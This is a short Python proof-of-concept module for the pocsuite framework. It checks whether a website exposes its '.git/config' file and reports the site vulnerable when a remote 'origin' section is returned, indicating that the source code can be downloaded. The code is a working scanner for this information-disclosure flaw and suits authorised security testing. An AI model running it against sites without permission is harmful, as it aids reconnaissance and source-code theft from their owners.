#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = ''  # vul ID
    version = '1'
    author = ['erevus']
    vulDate = '2015-03-12'
    createDate = '2015-04-09'
    updateDate = '2015-04-09'
    references = ['http://www.wooyun.org/bugs/wooyun-2015-0100762']
    name = 'Git all Information Disclosure'
    appPowerLink = 'http://www.git-scm.com'
    appName = 'Git'
    appVersion = 'all'
    vulType = 'Information Disclosure'
    desc = '''
           .git/config 上传到服务器导致网站源码可down
    '''
    # the sample sites for examine
    samples = ['', '']

    def _verify(self):
        target_url = '/.git/config'

        response = req.get(self.url + target_url, timeout=10, verify=False)
        content = response.content
        if '[remote "origin"]' in content:
            result = {}
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url + target_url
        else:
            result = {}

        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('Internet Nothing returned')

        return output


register(TestPOC)
